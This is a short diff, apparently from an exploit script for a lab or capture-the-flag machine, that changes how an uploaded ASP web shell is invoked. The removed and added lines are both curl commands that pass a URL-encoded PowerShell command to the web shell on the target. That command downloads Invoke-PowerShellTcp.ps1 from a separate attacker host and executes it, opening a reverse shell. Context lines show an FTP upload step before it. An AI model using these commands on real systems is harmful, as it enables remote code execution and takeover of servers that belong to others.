@@ -11,4 +11,4 @@ put $LOCAL_FILE
 bye
 EOF
 
-curl -s http://10.10.10.116/upload/shell.asp?cmd=powershell+iex+%28New-Object+Net.WebClient%29.DownloadString%28%27http%3A%2F%2F10.10.14.13%3A8000%2FInvoke-PowerShellTcp.ps1%27%29
+curl -s http://10.10.10.116/upload/shell.asp?cmd=powershell+-c+%22IEX%28New-Object+Net.WebClient%29.downloadString%28%27http%3A%2F%2F10.10.14.13%3A8000%2FInvoke-PowerShellTcp.ps1%27%29%22
